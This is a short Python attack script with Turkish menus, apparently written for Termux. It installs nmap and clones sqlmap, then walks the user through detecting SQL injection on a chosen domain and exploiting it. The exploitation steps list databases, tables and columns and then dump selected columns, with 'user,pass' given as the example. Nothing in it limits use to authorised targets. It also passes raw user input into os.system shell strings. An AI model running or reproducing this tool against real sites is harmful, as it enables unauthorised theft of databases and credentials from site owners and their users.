#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("pkg install git -y")
os.system("pkg install figlet -y")
os.system("pkg install nmap -y")
os.system("clear")
os.system("figlet SQL INJECTION")

print("""
Bu Araç SQL Injection güvenlik açığı tespiti ve istismarı için, nmap ve sqlmap araçlarını kullanır.

1) SQL Açığı Tespiti
2) SQL Açığı İstismarı


""")

secim = input("Seçim : ")
	
if(secim=="1"):
	hedef = input("Hedef Domain : ")
	os.system("clear")
	os.system("nmap -sV --script=http-sql-injection " + hedef)
	
elif(secim=="2"):
	os.system("git clone https://github.com/sqlmapproject/sqlmap.git")
	os.system("clear")
	os.system("figlet SQL ISTISMAR")
	print("""
	1) Veritabanı Öğren
	2) Tablo Öğren
	3) Kolon Öğren
	4) Bilgileri Çek
	
	""")
	
	secim = input("Seçim : ")
	
	if(secim=="1"):
		link = input("Link : ")
		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " --dbs --batch")
		
	elif(secim=="2"):
		link = input("Link : ")
		veritabani = input("Veritabanı Adı : ")
		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " --tables --batch")
		
	elif(secim=="3"):
		link = input("Link : ")
		veritabani = input("Veritabanı Adı : ")
		tablo = input("Tablo : ")
		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " -T " + tablo + " --columns --batch")
		
	elif(secim=="4"):
		link = input("Link : ")
		veritabani = input("Veritabanı Adı : ")
		tablo = input("Tablo : ")
		kolon = input("Kolon (user,pass) : ")
		os.system("cd sqlmap/ && python sqlmap.py -u " + link + " -D " + veritabani + " -T " + tablo + " -C " + kolon + " --dump --batch")		
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	